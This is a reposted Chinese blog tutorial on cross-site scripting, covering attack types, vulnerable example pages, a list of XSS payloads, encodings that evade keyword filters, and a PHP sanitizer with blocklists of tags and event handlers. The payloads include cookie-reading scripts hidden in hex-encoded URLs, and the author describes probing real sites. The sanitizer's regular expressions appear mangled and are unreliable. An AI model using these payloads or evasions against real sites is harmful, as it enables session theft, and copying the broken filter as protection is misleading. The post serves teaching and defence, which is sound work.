---
layout: post
title: "【转载】XSS 攻击与防御"
date: 2016-08-01 8:46
tags: XSS
category: web
author: Aidan
---

XSS攻击：跨站脚本攻击（Cross Site Scripting），为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆。故将跨站脚本攻击缩写为XSS。XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它 用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略（same origin policy）。这种类型的漏洞由于被骇客用来编写危害性更大的phishing攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新 型的"缓冲区溢出攻击"，而JavaScript是新型的"ShellCode"。

在2007年OWASP所统计的所有安全威胁中，跨站脚本攻击占到了22%，高居所有Web威胁之首。

注：OWASP是世界上最知名的Web安全与数据库安全研究组织

# 1 XSS攻击的危害

1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号

2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力

3、盗窃企业重要的具有商业价值的资料

4、非法转账

5、强制发送电子邮件

6、网站挂马

7、控制受害者机器向其它网站发起攻击

# 2 XSS漏洞的分类

XSS漏洞按照攻击利用手法的不同，有以下三种类型：

1、类型A，本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。

其攻击过程如下所示：

- Alice给Bob发送一个恶意构造了Web的URL。

- Bob点击并查看了这个URL。

- 恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。

- 具有漏洞的HTML页面包含了在Bob电脑本地域执行的JavaScript。

- Alice的恶意脚本可以在Bob的电脑上执行Bob所持有的权限下的命令。

2、类型B，反射式漏洞，这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。

其攻击过程如下：

- Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息（比如银行帐户信息）。

- Charly发现Bob的站点包含反射性的XSS漏洞。

- Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。

- Alice在登录到Bob的站点后，浏览Charly提供的URL。

- 嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息（授权、信用卡、帐号信息等）然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。

3、类型C，存储式漏洞，该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。

其攻击过程如下：

- Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。

- Charly注意到Bob的站点具有类型C的XXS漏洞。

- Charly发布一个热点信息，吸引其它用户纷纷阅读。

- Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。

类型A直接威胁用户个体，而类型B和类型C所威胁的对象都是企业级Web应用。

# 3 XSS攻击原理及攻击方式

XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。

使用过ASP的同学一定见过这样的代码：

```asp
Hello,
<%
Response.Write(Request.Querystring("name"))
%>
```

假如我传入的name的值为：

```javascript
<script>x=document.cookie;alert(x);</script>
```

这样就可以直接盗取用户的cookie。所以我就可以发送一条链接地址让别人去点：

```
http://www.xxx.com/reg.asp?name=<script>x=document.cookie;alert(x);</script>
```

当然这样做没有一点隐蔽性，虽然前面的xxx.com瞒过了少数人，但大多数人可以辨认出后面的javascript代码，所以，我只需要将后面的javascript代码转换成URL的16进制，如：

```
http://www.xxx.com/reg.asp?name=%3C%73%63%72%69%70%74%3E%78%3D%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3B%61%6C%65%72%74%28%78%29%3B%3C%2F%73%63%72%69%70%74%3E
```

上面的URL你还认得吗？除非你把它转换出来。（进制转换可以使用Napkin工具，哎，太坏了。。有人问Napkin的下载地址，贴在这里好 了：[http://www.0×90.org/releases/napkin/Napkin-1.0-Windows.zip](http://www.0×90.org/releases/napkin/Napkin-1.0-Windows.zip)）

根本原因:

1、没有对输入进行约束，没有对输出进行编码

2、没有严格区分"数据"和"代码"

示例：

很多网站存在这样的漏洞，我们在搜索框中输入：

```
"/><div style="position:absolute;left:0px;top:0px;"><iframe src="http://www.baidu.com" FRAMEBORDER=0 width=1000 height=900/></div><a href="
```

我尝试在各种不同网站寻找 XSS 漏洞， baidu, amazon.cn, youku.com, dangdang.com等等。结果，我发现XSS漏洞非常普遍！其实XSS利用的是网页的回显，即，接收用户的输入，然后再在页面显示用户的输入。总结

一下几个可能会出现漏洞的地方：

```
搜索引擎
留言板
错误页面
```

通过在上面那些类型的页面输入一些特殊的字符（包括< > / "），如：</?jjkk>，然后在结果页中的源码处搜索是否存在原样的：</?jjkk>，如果存在，恭喜你，发现了一个XSS漏洞。

# 4 XSS 攻击分类

## 4.1 DOM-based cross-site scripting

页面本身包含一些DOM对象的操作，如果未对输入的参数进行处理，可能会导致执行恶意脚本。如下面一些DOM操作：

```
document.URL
document.URLUnencoded
document.location (and many of its properties)
document.referrer
window.location (and many of its properties)
```

举个例子，假如某个脆弱的页面的代码如下：

```html
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<script>
		var pos = document.URL.indexOf("name=") + 5;
			document.write(document.URL.substring(pos,document.URL.length));
	</script>
</head>
<body>
	Welcome to our system
</body>
</html>
```

攻击者使用如下的URL访问时，则非常危险：

```
http://www.vulnerable.site/welcome.html?name=<script>alert(document.cookie)</script>
```

试了一下，貌似IE、FireFox等浏览器默认对

```javascript
<script>alert(document.cookie)</script>
```

进行了编码，阻止了脚本的执行。但是对于DOM操作还是要更加谨慎啊，比如把上面的页面修改一下，安全性就增强了不少：

```html
<!DOCTYPE html>
<html>
<head>
	<title></title>
	<script>
		var pos = document.URL.indexOf("name=") + 5;
		var name = document.URL.substring(pos, document.URL.length);
		if (name.match(/^[a-zA-Z0-9]$/)) {
			document.write(name);
		}else{
			window.alert("Security error");
		}
	</script>
</head>
<body>
	Welcome to our system
</body>
</html>
```

## 4.2 Reflected cross-site scripting

也被称为None-Persistent cross-site scripting，即，非持久化的XSS攻击，是我们通常所说的，也是最常用，使用最广的一种方式。它通过给别人发送带有恶意脚本代码参数的URL，当 URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接菜能引起。

## 4.3 Persistent cross-site scripting

持久化XSS攻击，指的是恶意脚本代码被存储进被攻击的数据库，当其他用户正常浏览网页时，站点从数据库中读取了非法用户存入非法数据，恶意脚本代码被执行。这种攻击类型通常在留言板等地方出现。

实施方式:

我们来试一把Reflected cross-site scripting。当我们在某网站输入参数XXX，发现参数XXX原样的出现在了页面源码中：

```html
<input type="text" class="Seach" name="w" value="XXX" />
```

OK，可以开始做文章了，我们将XXX替换为：

```
abc"/><script>alert("haha")</script><a href="
```

返回的HTML代码如下：

```html
<input type="text" class="Seach" name="w" value="abc"/>
<script>alert("haha")</script><!–" />
```

这样，

```
<script>alert("haha")</script>
```

被执行了。这里再举例一些XSS攻击行为：

```
<img src="javascript:alert("xss");">
<img src=javascript:alert("xss")>
<img src="javascript:alert(string.fromcharcode(88,83,83))">
<img src="jav ascript:alert("xss");">
<script/xss src="http://example.com/xss.js"></script>
<<script>alert("xss");//<</script>
<iframe src=http://example.com/scriptlet.html <
<input type="image" src="javascript:alert("xss");">
<body background="javascript:alert("xss")">
<body onload=alert(document.cookie)>
<body onload!#$%&()*~+-_.,:;?@[/|"]^`=alert("xss")>
<img dynsrc="javascript:alert("xss")">
<img dynsrc="javascript:alert("xss")">
<br size="&{alert("xss")}">
<img src="vbscript:msgbox("xss")">
<table background="javascript:alert("xss")">
<div style="width: expression(alert("xss"));">
<div style="background-image: url(javascript:alert("xss"))">
<style type="text/javascript">alert("xss");</style>
<style type="text/css">body{background:url("javascript:alert("xss")")}</style>
<?="<script>alert("xss")</script>"?>
<a href="javascript:document.location="http://www.example.com/"">xss</a>
<img src=javascript:alert("xss")>
<embed src="http://ha.ckers.org/xss.swf" allowscriptaccess="always"></embed>
a="get";
b="url(""";
c="javascript:";
d="alert("xss");"")";
eval(a+b+c+d);
```

# 5 XSS攻击防御

## 5.1 基于特征的防御

XSS漏洞和著名的SQL注入漏洞一样，都是利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。

传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对 "javascript"这个关键字进行检索，一旦发现提交信息中包含"javascript"，就认定为XSS攻击。这种检测方法的缺陷显而易见：骇客可以通过插入字符或完全编码的方式躲避检测：

躲避方法1:

在javascript中加入多个tab键，得到

```
<img src="jav ascript:alert("XSS");" >
```

躲避方法2:

在javascript中加入&#x09编码字符，得到

```
<img src="javascript:alert("XSS");" >
```

躲避方法3:
在javascript中的每个字符间加入回车换行符，得到

```
<img stc="j\r\na\r\nv\r\n\r\na\r\ns\r\nc\r\nr\r\ni\r\np\r\nt\r\n:alert("XSS");" >
```

躲避方法4

对"javascript:alert("XSS")"采用完全编码，得到

```
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29 >
```

上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的

还存在大量的误报可能：在上面的例子中，对"http://www.xxx.com/javascript/kkk.asp?id=2345 "这样一个URL，由于包含了关键字"javascript"，也将会触发报警。

## 5.2 基于代码修改的防御

和SQL注入防御一样，XSS攻击也是利用了Web页面的编写疏忽，所以还有一种方法就是从Web应用开发的角度来避免：

步骤1、对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。

步骤2、实现Session标记（session tokens）、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行。

步骤3、确认接收的的内容被妥善的规范化，仅包含最小的、安全的Tag（没有javascript），去掉任何对远程内容的引用（尤其是样式表和javascript），使用HTTP only的cookie。

当然，如上操作将会降低Web业务系统的可用性，用户仅能输入少量的制定字符，人与系统间的交互被降到极致，仅适用于信息发布型站点。并且考虑到很少有Web编码人员受过正规的安全培训，很难做到完全避免页面中的XSS漏洞（注 ）。

附上防御代码（不是我写的）：
The goal of this function is to be a generic function that can be usedto parse almost any input and render it XSS safe. For more informationon actual XSS attacks, check out http://ha.ckers.org/xss.html .  Another excellent site is the XSS Database which details each attack and how it works.

```php
function RemoveXSS ( $val ) {
	// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed
	// this prevents some character re-spacing such as <java\0script>
	// note that you have to handle splits with n, r, and t later since they *are* allowed in some inputs
	$val = preg_replace ( "/([x00-x08,x0b-x0c,x0e-x19])/" , "", $val );

	// straight replacements, the user should never need these since they"re normal characters
	// this prevents like <IMG SRC=@avascript:alert("XSS")>
	$search = "abcdefghijklmnopqrstuvwxyz";
	$search .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$search .= "1234567890!@#$%^&amp;*()";
	$search .= "~`&quot;;:?+/={}[]-_|\/\"";
	for ($i = 0; $i < strlen($search); $i++) {
		// ;? matches the ;, which is optional
		// 0{0,7} matches any padded zeros, which are optional and go up to 8 chars
		// @ @ search for the hex values
		$val = preg_replace("/(&amp; #[xX]0{0,8}".dechex(ord($search[$i])).";?)/i", $search[$i], $val); // with a ;
		// @ @ 0{0,7} matches "0′ zero to seven times
		$val = preg_replace ( "/(&amp;#0{0,8}".ord ($search[$i]).";?)/" , $search[$i], $val ); // with a ;
	}
	// now the only remaining whitespace attacks are t, n, and r
		$ra1 = Array( "javascript" , "vbscript" , "expression" , "applet" , "meta" , "xml" , "blink" , "link" , "style" , "script" , "embed" , "object" , "iframe" , "frame" , "frameset" , "ilayer" , "layer" , "bgsound" , "title" , "base" );
		
		$ra2 = Array( "onabort" , "onactivate" , "onafterprint" , "onafterupdate" ,
		 "onbeforeactivate" , "onbeforecopy" , "onbeforecut" , "onbeforedeactivate" , "onbeforeeditfocus" , "onbeforepaste" , "onbeforeprint" , "onbeforeunload" , "onbeforeupdate" , "onblur" , "onbounce" , "oncellchange" , "onchange" , "onclick" , "oncontextmenu" , "oncontrolselect" , "oncopy" , "oncut" , "ondataavailable" , "ondatasetchanged" , "ondatasetcomplete" , "ondblclick" , "ondeactivate" , "ondrag" , "ondragend" , "ondragenter" , "ondragleave" , "ondragover" , "ondragstart" , "ondrop" , "onerror" , "onerrorupdate" , "onfilterchange" , "onfinish" , "onfocus" , "onfocusin" , "onfocusout" , "onhelp" , "onkeydown" , "onkeypress" , "onkeyup" , "onlayoutcomplete" , "onload" , "onlosecapture" , "onmousedown" , "onmouseenter" , "onmouseleave" , "onmousemove" , "onmouseout" , "onmouseover" , "onmouseup" , "onmousewheel" , "onmove" , "onmoveend" , "onmovestart" , "onpaste" , "onpropertychange" , "onreadystatechange" , "onreset" , "onresize" , "onresizeend" , "onresizestart" , "onrowenter" , "onrowexit" , "onrowsdelete" , "onrowsinserted" , "onscroll" , "onselect" , "onselectionchange" , "onselectstart" , "onstart" , "onstop" , "onsubmit" , "onunload" );
		$ra = array_merge ( $ra1 , $ra2 );
	
		$found = true ; // keep replacing as long as the previous round replaced something
		while ( $found == true ) {
			$val_before = $val ;
			for ($i = 0 ; $i < sizeof ( $ra ); $i ++) {
				$pattern = "/" ;
				for ($j = 0 ; $j < strlen ( $ra [ $i ]); $j ++) {
					if ($j > 0 ) {
						$pattern .= "(" ;
						$pattern .= "(&amp;#[xX]0{0,8}([9ab]);)" ;
						$pattern .= "|" ;
						$pattern .= "|(&amp;#0{0,8}([9|10|13]);)" ;
						$pattern .= ")*" ;
					}
					$pattern .= $ra [ $i ][ $j ];
				}
				$pattern .= "/i" ;
				$replacement = substr ( $ra [ $i ], 0 , 2 ). "<x>" . substr ( $ra [ $i ], 2 ); // add in <> to nerf the tag
				$val = preg_replace ( $pattern , $replacement , $val ); // filter out the hex tags
				if ( $val_before == $val ) {
					// no replacements were made, so exit the loop
					$found = false ;
				}
			}
		}
	return $val ;
}             
```



>原文：
>
>[XSS攻击与防御](http://www.cnblogs.com/dongzhiquan/archive/2010/08/08/1994581.html)